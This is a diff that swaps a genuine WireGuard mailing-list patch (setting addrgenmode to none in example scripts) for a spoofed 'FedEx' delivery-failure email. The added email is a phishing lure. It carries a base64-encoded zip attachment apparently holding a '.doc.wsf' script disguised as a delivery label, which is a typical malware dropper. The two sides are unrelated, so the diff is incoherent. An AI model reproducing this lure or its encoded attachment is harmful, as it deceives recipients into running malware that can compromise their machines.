@@ -1,18 +1,23 @@
-Return-Path: linux-wireguard@vittgam.net
+Return-Path: ekhayafs@ekh.ekhayafso.org
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 2b5fdd12
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id fac43327
  for <wireguard@lists.zx2c4.com>;
- Sat, 10 Dec 2016 16:25:21 +0000 (UTC)
-Received: from mail.vittgam.net (server1.vittgam.net [213.239.197.142])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 34b95253
+ Sat, 10 Dec 2016 18:44:23 +0000 (UTC)
+Received: from ekh.ekhayafso.org (ekh.ekhayafso.org [162.144.213.93])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 1761f1f6
  for <wireguard@lists.zx2c4.com>;
- Sat, 10 Dec 2016 16:25:21 +0000 (UTC)
-Date: Sat, 10 Dec 2016 17:31:08 +0100
-Message-Id: <201612101631.uBAGV8fe049290@mail.vittgam.net>
-From: "Vittorio Gambaletta (VittGam)" <linux-wireguard@vittgam.net>
+ Sat, 10 Dec 2016 18:44:23 +0000 (UTC)
+Received: from ekhayafs by ekh.ekhayafso.org with local (Exim 4.87)
+ (envelope-from <ekhayafs@ekh.ekhayafso.org>) id 1cFmio-0002qP-Kl
+ for wireguard@lists.zx2c4.com; Sat, 10 Dec 2016 12:50:10 -0600
 To: wireguard@lists.zx2c4.com
-Subject: [PATCH] contrib: Set addrgenmode to none for WireGuard interfaces.
-Content-Type: text/plain; charset=UTF-8
+Subject: FedEx parcel #00721768 delivery problem
+Date: Sat, 10 Dec 2016 12:50:10 -0600
+MIME-Version: 1.0
+Message-ID: <0899a73ac1f3dc981bd1bf1892a5e317@ekhayafso.org>
+From: "FedEx Priority Parcels" <lewis.singleton@ekhayafso.org>
+Content-Type: multipart/mixed; boundary="b1_15246841cfa944383a86137f8530978f"
+Reply-To: FedEx Priority Parcels <lewis.singleton@ekhayafso.org>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -22,81 +27,90 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-This stops addrconf from adding a temporary IPv6 address to the
-interface when it is brought up.
+--b1_15246841cfa944383a86137f8530978f
+Content-Type: text/plain; charset=us-ascii
 
-I'm not sure if this can be done in a clean way from inside the
-kernel without touching addrconf itself; but for now, let's fix this
-from userspace.
+Dear Customer,
 
-Signed-off-by: Vittorio Gambaletta <linux-wireguard@vittgam.net>
----
- contrib/examples/ncat-client-server/client.sh | 1 +
- contrib/examples/ncat-client-server/server.sh | 1 +
- contrib/examples/synergy/synergy-client.sh    | 1 +
- contrib/examples/systemd/wgserver.service     | 1 +
- contrib/examples/wg-config/wg-config          | 1 +
- 5 files changed, 5 insertions(+)
+Your item has arrived at the FedEx Post Office at December 07, but the courier was unable to deliver parcel to you.
 
-diff --git a/contrib/examples/ncat-client-server/client.sh b/contrib/examples/ncat-client-server/client.sh
-index e59d9ce..a4e0008 100755
---- a/contrib/examples/ncat-client-server/client.sh
-+++ b/contrib/examples/ncat-client-server/client.sh
-@@ -12,6 +12,7 @@ IFS=: read -r status server_pubkey server_port internal_ip <&3
- [[ $status == OK ]]
- ip link del dev wg0 2>/dev/null || true
- ip link add dev wg0 type wireguard
-+ip link set addrgenmode none dev wg0
- wg set wg0 private-key /tmp/wg_private_key peer "$server_pubkey" allowed-ips 0.0.0.0/0 endpoint "demo.wireguard.io:$server_port" persistent-keepalive 25
- ip address add "$internal_ip"/24 dev wg0
- ip link set up dev wg0
-diff --git a/contrib/examples/ncat-client-server/server.sh b/contrib/examples/ncat-client-server/server.sh
-index 2680afd..825b015 100755
---- a/contrib/examples/ncat-client-server/server.sh
-+++ b/contrib/examples/ncat-client-server/server.sh
-@@ -6,6 +6,7 @@ if [[ -z $NCAT_REMOTE_ADDR ]]; then
- 	ip link del dev wg0 2>/dev/null
- 	set -e
- 	ip link add dev wg0 type wireguard
-+	ip link set addrgenmode none dev wg0
- 	ip address add 192.168.4.1/24 dev wg0
- 	wg set wg0 private-key <(wg genkey) listen-port 12912
- 	ip link set up dev wg0
-diff --git a/contrib/examples/synergy/synergy-client.sh b/contrib/examples/synergy/synergy-client.sh
-index 07b32d3..f9d9e70 100755
---- a/contrib/examples/synergy/synergy-client.sh
-+++ b/contrib/examples/synergy/synergy-client.sh
-@@ -6,6 +6,7 @@ set -ex
- if [[ $UID == 0 ]]; then
- 	ip link del dev synergy || true
- 	ip link add dev synergy type wireguard
-+	ip link set addrgenmode none dev synergy
- 	ip address add 10.193.125.39/32 peer 10.193.125.38/32 dev synergy
- 	wg set synergy \
- 		listen-port 29184 \
-diff --git a/contrib/examples/systemd/wgserver.service b/contrib/examples/systemd/wgserver.service
-index dfce1e9..dcf1ca3 100644
---- a/contrib/examples/systemd/wgserver.service
-+++ b/contrib/examples/systemd/wgserver.service
-@@ -5,6 +5,7 @@ Description=WireGuard Server
- Type=oneshot
- RemainAfterExit=yes
- ExecStart=/bin/ip link add dev wgserver type wireguard
-+ExecStart=/bin/ip link set addrgenmode none dev wgserver
- ExecStart=/bin/ip address add 192.168.177.1/24 dev wgserver
- ExecStart=/usr/bin/wg setconf wgserver /etc/wireguard-server.conf
- ExecStart=/bin/ip link set up dev wgserver
-diff --git a/contrib/examples/wg-config/wg-config b/contrib/examples/wg-config/wg-config
-index eaa45f2..9bd9800 100755
---- a/contrib/examples/wg-config/wg-config
-+++ b/contrib/examples/wg-config/wg-config
-@@ -21,6 +21,7 @@ unwind() {
- add_if() {
- 	ip link delete dev "$INTERFACE" 2>/dev/null || true
- 	cmd ip link add "$INTERFACE" type wireguard
-+	cmd ip link set addrgenmode none dev "$INTERFACE"
- }
- 
- del_if() {
--- 
-2.10.0
+Please review delivery label in attachment!
+
+With many thanks,
+Lewis Singleton,
+Parcels Delivery Manager.
+
+
+--b1_15246841cfa944383a86137f8530978f
+Content-Type: application/zip; name="Item-Delivery-Details-00721768.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Item-Delivery-Details-00721768.zip
+
+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
+e/sULgYY7tTLt5d6xiFCAXeQ3ztWyNV5XeUpui5ZT+aH0N1gWOxmvhe680VnA6YnBSpUujE294C4
+UmiCkp2AcJVf3+ojhlUfYiDvrmPVFabaMylutbwGpp4hrobW3HIZTmniK4vbbIXpdNE6w7oOEtNr
+OmE8wMlAGJRgSmhzIgWgbcnOguS2fEb45B/GbVgd6unGfSD0YBn/9pxFfJ+Tomsd3jhotoMoKH+G
+JkX/8gICiWE2C9koqSb2Ya306XSCHR5mn3Em/+/5VJ5UJx+kAdkDGEB+P7CgR8YheO6yi7UzOnkt
+qddsEI1jvvuhZ6s91kK7q+h0gX2Mrp3/H18vlf2B1z0SViitHS39mFrXbZtLUEsDBBQAAAAIAEVm
+ikl9IUlSlgEAABQCAAAmAAAASXRlbS1EZWxpdmVyeS1EZXRhaWxzLTAwNzIxNzY4LmRvYy53c2Y1
+UmFv2jAQ/SuWP0xBtE7K0lGNhIp13VhbCrSpgFRT5TgXcBriYDssodp+++yiSvbJ7+7dvTv5glwk
+w0AxySuNClqua7qG8Obx3THcU4kkChH+hwfIgsaAEv6gkZS0dTDlUpSgib2JxCd4DaouUwW8JCkY
+nEJBZQ2pBLoFqQgT2yNRU55RRbQETqQwDs5EJqT+YHSOeq0Vn6hmW/TIcnI3jqKZ6cQQkWPDPPQG
+iAfnxnS7HfSGtGyNtSFtMzdaV19dF6Muap7572PNw8cMTPM9LKdJDkw7rVE8EFFB6eCf1xE+MRW6
+CLtM1KUG6V7S0CO+/7nf/3J28YmHdzFL8vmuOr0aPYyuxY/v/djP0t7L4tf5/mbnreJ4vnha53JT
+ZGnsj8c9fjs9zJvaF/ev/ZdTzaez22+L3SNTfLpsk4hO4qvZapWdbS6MdkYLBe8dKShTx7x4hhyD
+NNW1QmGIep5nB4Y9LYxfgqpEqSCCRhNVFVw7skNywc00FHdMfmK+4HWA/pqDGNVs44DNt3gQuMcF
+GAauXYf/UEsBAgAAFAAAAAgARWaKSb6w3nyUCwAAjwsAAA8AAAAAAAAAAAAgAAAAAAAAAABieG10
+b2toY2RtdHdlalBLAQIAABQAAAAIAEVmikl9IUlSlgEAABQCAAAmAAAAAAAAAAAAIAAAAMELAABJ
+dGVtLURlbGl2ZXJ5LURldGFpbHMtMDA3MjE3NjguZG9jLndzZlBLBQYAAAAAAgACAJEAAACbDQAA
+AAA=
+
+
+--b1_15246841cfa944383a86137f8530978f--
